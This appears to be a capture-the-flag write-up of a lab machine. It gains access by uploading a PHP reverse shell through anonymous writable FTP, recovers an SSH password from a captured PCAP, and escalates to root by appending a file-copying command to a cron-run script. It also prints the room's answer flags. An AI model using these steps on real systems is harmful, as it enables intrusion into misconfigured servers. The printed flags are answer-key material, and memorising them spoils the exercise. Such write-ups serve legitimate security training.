---
share: true
---

## 1. Initial Enumeration

I started with an Nmap scan:

```bash
nmap -sC -sV -oN nmap.txt 10.130.157.118
```

**Results:**
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Maintenance
```

- **FTP** (port 21): vsftpd 3.0.3, anonymous login allowed, writeable directory, files: `important.jpg`, `notice.txt`
- **SSH** (port 22): OpenSSH 7.2p2
- **HTTP** (port 80): Apache 2.4.18, "Maintenance" page

---

## 2. FTP Enumeration

Anonymous FTP login is allowed:

```bash
ftp 10.130.157.118
# Username: anonymous
# Password: anonymous
```

Successfully connected. Downloaded the image:

```bash
wget ftp://10.130.157.118/important.jpg
```

Checked the file with `exiftool`:

```bash
exiftool important.jpg
```

- The file is actually a PNG (`File Type: PNG`)
- Verified with `hexedit`: the header bytes are `89 50 4E 47 0D 0A 1A 0A` (PNG signature)

---

## 3. Web Enumeration

Used directory brute-forcing and discovered `/files/` directory on the web server.

This means I can upload a reverse shell via FTP and execute it from `http://10.130.157.118/files/`.

---

## 4. Gaining a Shell

Downloaded a PHP reverse shell from [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php), changed the IP and port to my own (tun0 interface), and renamed it:

```bash
mv php-reverse-shell.php shell.php
```

Uploaded the shell via FTP:

```bash
ftp> put shell.php
```

Started a netcat listener:

```bash
nc -lnvp 1234
```

Triggered the shell by visiting:

```
http://10.130.157.118/files/shell.php
```

---

## 5. Initial Foothold

Inside the web shell, found a file `recipie.txt` containing the first flag:

```
love
```

Discovered a directory `/incidents/` containing `suspicious.pcapng`.

---

## 6. Transferring Files

Used Python3 HTTP server on the target to transfer the PCAP file:

**On the target:**
```bash
ip -br a
python3 -m http.server 8888
```

**On my machine:**
```bash
wget http://10.130.157.118:8888/incidents/suspicious.pcapng
```

---

## 7. PCAP Analysis

Opened `suspicious.pcapng` in Wireshark.

- Found a request containing `cat /etc/passwd/`
- In the TCP stream, saw a password being tried for several users:  
  ```
  c4ntg3t3n0ughsp1c3
  ```
- Also found a user:  
  ```
  lennie:x:1002:1002::/home/lennie:
  ```

---

## 8. Privilege Escalation to User

Tried SSH login with the discovered credentials:

- **Username:** lennie
- **Password:** c4ntg3t3n0ughsp1c3

```bash
ssh lennie@10.130.157.118
```

Login successful.

Found `user.txt` containing the second flag:

```
THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
```

---

## 9. Privilege Escalation to Root

Explored the home directory and found a `scripts` folder containing `planner.sh`, which replaces `$LIST` with its current value and writes it to `startup_list.txt`, then calls an external shell script `print.sh`.

After some research, found a simple payload to escalate privileges:

```bash
echo "cp /root/* /home/lennie; chmod 777 /home/lennie/*" >> /etc/print.sh
```

This copies all files from `/root/` to `/home/lennie` and makes them world-readable.

Navigated to `/home/lennie` and read the root flag:

```
THM{f963aaa6a430f210222158ae15c3d76d}
```

---

## 10. Summary of Flags

- **First flag:** `love` (from recipie.txt)
- **User flag:** `THM{03ce3d619b80ccbfb3b7fc81e46c0e79}`
- **Root flag:** `THM{f963aaa6a430f210222158ae15c3d76d}`

---

**References:**
- [Pentestmonkey PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell)

---
